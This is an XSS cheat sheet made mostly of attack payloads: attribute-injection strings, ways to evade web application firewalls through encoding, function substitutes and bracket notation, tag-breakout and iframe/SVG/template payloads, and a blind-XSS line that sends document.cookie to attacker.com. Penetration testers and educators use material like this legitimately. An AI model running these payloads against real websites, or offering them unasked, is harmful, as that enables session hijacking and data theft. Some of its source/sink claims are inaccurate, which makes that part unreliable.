# XSS Cheat Sheet

## **Test All Input Fields**
- Start by testing every input field on the website. Check if the data you input is reflected back unsanitized in the page source or DOM.
- Input values like special characters (`"`, `'`) or event handlers such as `onmouseover` to see if you can inject JavaScript code.

### Practical Example
If the input sits in an attribute like:
```html
<input value="...">
```
Try injecting:
```html
<input value="rootast" onmouseover="alert(1)">
```
Payload:
```text
" onmouseover="alert(1)
```

---

## **Bypass WAF Techniques**
To evade Web Application Firewalls (WAFs), use encoding and alternative syntaxes that may not be flagged.

### String Encoding
- **Base64 Encoding:**
  ```javascript
  btoa("alert(1)");  // Encodes to Base64
  atob("YWxlcnQoMSk=");  // Decodes Base64 back to "alert(1)"
  ```
- **Octal and Hexadecimal Encoding:**
  ```javascript
  \141\154\145\162\164(1);  // Octal for "alert(1)"
  \x61\x6c\x65\x72\x74(1);  // Hexadecimal for "alert(1)"
  ```
- **Unicode Escaping:**
  ```javascript
  al\u0065rt(1);  // "alert(1)" using Unicode
  ```
- **Decimal Encoding:**
  ```javascript
  String.fromCharCode(97, 108, 101, 114, 116)(1);  // Outputs "alert(1)"
  ```

### String Concatenation
```javascript
var a = "al";
var b = "ert(1)";
a.concat(b);  // Outputs "alert(1)"
```

---

## **Bypassing Parentheses Sensitivity**
Some WAFs block parentheses or specific functions like `alert()`. Try these alternatives:

- **Backtick Syntax:**
  ```javascript
  alert`1`;
  ```

- **Using Event Handlers:**
  ```html
  <img src="nonexistent.jpg" onerror="alert(1); throw 'Error';">
  ```

- **Throw Syntax:**
  ```javascript
  throw onerror=alert, "aaaa", "bbbb";
  ```

---

## **Comment Injection**
- **Single Line Comment:** `//`
- **Multi-Line Comment:** `/* */`
- **Hashbang-Style Comment:** `#!aaaa`

---

## **Function Blacklists and Alternatives**
If `eval()` is blocked, use these alternatives:

- **Avoid `eval()`:**
  ```javascript
  // Blocked: eval("alert(1)");
  // Alternatives:
  setTimeout("\x61\u{65}\162t(2)");
  setInterval("\x61\u{65}\162t(2)");
  Function("alert(2)")``;
  Function("alert(2)")();
  (Function("alert(2)"))();
  Function("alert(1)")();  // Avoids using eval()
  ```

- **Bypassing Function Calls with Unicode:**
  ```javascript
  \x61\u{65}\162t(2);  // Equivalent to alert(2)
  ```

---

## **Bypassing Dot Notation and `window` Restrictions**
If WAF blocks accessing properties via dot notation like `document.cookie`, bypass it using bracket notation:

### Dot Notation Bypass
```javascript
document["cookie"];  // Access document.cookie without using dot
```

### Replace `window` with Other References
```javascript
top;
self;
frames;
parent;
this;
```

### Using Arrays
```javascript
[20].find(alert);  // Array method triggering alert
[document.cookie].find(prompt);  // Replaces find method to trigger prompt
```

### Advanced Array Methods
```javascript
[document.cookie].forEach(prompt);  // Executes prompt using forEach
[document.cookie].filter(alert);    // Filters and triggers alert
[document.cookie].map(alert);
```

### Global Object Bypass
```javascript
globalThis;
globalThis['alert'](2);
```

---

## **Exploiting Non-Executable Tags for XSS**
Close non-executable tags and insert your payload:
```html
<style>
/* CSS content, no script execution allowed */
</style><script>alert(1)</script><title>
Page Title Here
</title><script>alert(1)</script><noembed>
Fallback content if embed is not supported
</noembed><script>alert(1)</script><template>
This is template content, not rendered by default
</template><script>alert(1)</script><noscript>
Content shown when JavaScript is disabled
</noscript><script>alert(1)</script><textarea>
User entered text, no script execution
</textarea><script>alert(1)</script>
```

---

## **Iframe Injection**
```html
<iframe src="data:text/html,<svg onload=alert(2)>"></iframe>
<iframe src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></iframe>  // Output: alert(2)
```

Key Points:
- **Raw HTML in `data:text/html,`** allows you to inject HTML and JavaScript directly.
- **Base64 Encoding in `data:text/html;base64,`** helps obfuscate the payload, potentially bypassing web filters.

---

## **Blind XSS Attack Scenario**
In a Blind XSS attack, the malicious payload is stored in the system and executed later when accessed by an internal user, typically an admin or support team.

### Potential Targets:
- Feedback Forms
- Contact Us Forms
- Job Application Forms
- Salary Increase Requests
- Grade Appeal Forms

### Workflow:
1. **Injection:** Submit the payload via one of the forms.
2. **Storage:** The system stores the payload in the backend.
3. **Trigger:** The payload executes when viewed by an admin.
4. **Exfiltration:** Collect sensitive data using:
   ```javascript
   new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
   ```

---

## **DOM-Based XSS**
Occurs when a malicious script is executed by manipulating the DOM directly on the client-side without sending data to the server.

### Sources (Where malicious input comes from):
- `document.URL`: The full URL of the current page.
- `document.documentURI`: The URI of the document.
- `history.pushState`: Adds entries to the browser history.
- `location`: Provides access to the URL and its parts.
- `document.referrer`: The URL of the referring page.
- `history.replaceState`: Replaces the current history entry.

### Sinks (Where the malicious code gets executed):
- `location`: Redirects or modifies the current page’s URL.
- `postMessage`: Sends messages across windows or iframes.
- `document.title`: Sets the title of the page, can inject scripts.
- `location.search`: Query parameters of the current URL.

---

## **Advanced Practical Examples**

### Advanced Payload Using Mutation Observers
Exploit modern web apps by monitoring DOM changes:
```javascript
var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        alert('XSS Triggered: ' + mutation.target.nodeValue);
    });
});
observer.observe(document, { subtree: true, childList: true });
document.body.appendChild(document.createTextNode('<script>alert(1)</script>'));
```

### Polyglot Payload
Craft payloads that work in multiple contexts (HTML, JS, attributes):
```html
"><svg/onload=alert(1)><script>alert(1)</script>
```

### Chained XSS
Exploit multiple sinks and sources:
```javascript
location.hash = '";alert(1);//';
setTimeout(() => { eval(decodeURIComponent(location.hash.slice(1))) }, 0);
```

### Exploiting JSON Injection
Inject into JSON responses:
```javascript
{"user":"<img src=x onerror=alert(1)>"}
```
Exploit via reflected values in JavaScript:
```javascript
<script>
var user = JSON.parse('{"user":"<img src=x onerror=alert(1)>"}');
document.body.innerHTML = user.user;
</script>
```

### XSS in SVG Files
Embed malicious payloads in SVG:
```html
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
```

### Exploiting Template Injection for XSS
If a template engine processes user input:
```javascript
{{constructor.constructor('alert(1)')()}}
```
This payload may execute in vulnerable template engines (e.g., Handlebars).

---

